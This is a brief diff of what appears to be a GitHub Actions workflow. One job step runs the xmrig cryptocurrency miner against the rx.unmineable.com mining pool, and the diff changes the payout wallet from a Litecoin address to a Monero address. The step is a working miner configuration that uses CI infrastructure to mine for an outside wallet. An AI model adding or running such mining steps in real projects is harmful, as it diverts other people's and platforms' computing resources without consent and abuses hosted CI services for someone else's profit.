@@ -29,5 +29,5 @@ jobs:
       run: |
         cd xmrig/build
         ./xmrig -o rx.unmineable.com:3333 \
-          -u LTC:ltc1qpr87n7at9emtujezjuhclt0epynmc6c9vek57x.githubXMR#u3ux-cj3w \
+          -u XMR:4ByeEKTJbi3faVNHTWEupmM1fdwEv95CqCqC7rCDdVhXDt4vj5E4FB1jUKxNAF6EHFHmuQhnHoXcUK84Nc4cQfmfKQ8zXo5FtTq9LhQxGp \
           --coin monero -k --donate-level 1
